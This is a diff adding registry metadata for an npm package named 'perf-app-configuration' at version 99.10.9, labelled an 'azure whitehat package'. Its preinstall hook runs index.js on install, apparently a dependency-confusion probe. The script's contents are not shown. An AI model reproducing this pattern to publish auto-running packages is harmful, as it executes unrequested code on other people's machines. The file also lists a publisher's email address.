@@ -1,0 +1,39 @@
+{
+    "name": "perf-app-configuration",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "perf-app-configuration@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-zN3GOmOTR0hhQ++pT/0FLk1VcWT+4tUF3YTQTk1lTPKKFSuZhNzLTZfuNIokITTJUIdW9X4u5UyXjRIOjKx81Q==",
+        "shasum": "0da92455d90153dad9aff5733a9fff8c0cad1a9c",
+        "tarball": "https://registry.npmjs.org/perf-app-configuration/-/perf-app-configuration-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3586,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhon5eCRA9TVsSAnZWagAAnscP/11oDlMqOIgm9nWUltES\nlWSk0xyfb+3lmOyo2K1YvSGlrA1X6j9NR/gMcmhlk6GG/9svIaYuESX3hthF\n+ToQtERQ9spaudaMwYUtCDAIVB8OimIxXUwA45y4/eaZIYhp1PClyEsfqstE\nSabVgPjFpxZmbs50U7hgc4qSRFyev+CUcOv0lcorxxo5JT+eIoHWJO5IuVlT\ns5ND3FU6cXxcuyG1UjLkpMX8Il5aNx+8Sd3ymfC+FX39itnRjZAefNQuGdY+\n3mWXpsoQ9JwVTA7CjdZzhvm8jONEpfDc8Y3ZGeceHMQhqGtVNqXAmPTfOuoH\nvozX4rlRIdT/JZEhm6LZwDfWd8xwXsmcFKrp74VDYkdP4//Q82n75OVBGY1s\nRoYlGOsimacyzvx4l+wsUkzqQ301/95jYw8aiRSsshoSIqt/bEvuqBu2KTSE\nTtTwqYF5IqJluvKKSQ6yfOO922ELrWaHSXmuCcIwniRqLYw6aAOIxQOcB2Sn\n6msTdLA4kkc1FbVEoQ+n2MGPgtDZm2ZcXmO30D+33YCW99ct8m5uEd6pT/0b\nTrTdTQIU8WXKUytRwGMndTn4kvLR5bMTxUFQBYxUiWTUVbkjygvB6UCDTUn0\ne7fkM8W4o8JAF18qGo1Qiw3OjPzXOwAMCxkZBw5sYCJUKZ+l/Jv/GestxMjb\nsOfG\r\n=Awo0\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "rt11",
+        "email": "hussam.tes08@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "rt11",
+            "email": "hussam.tes08@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-app-configuration_99.10.9_1638039133895_0.3119158501390731"
+    },
+    "_hasShrinkwrap": false
+}
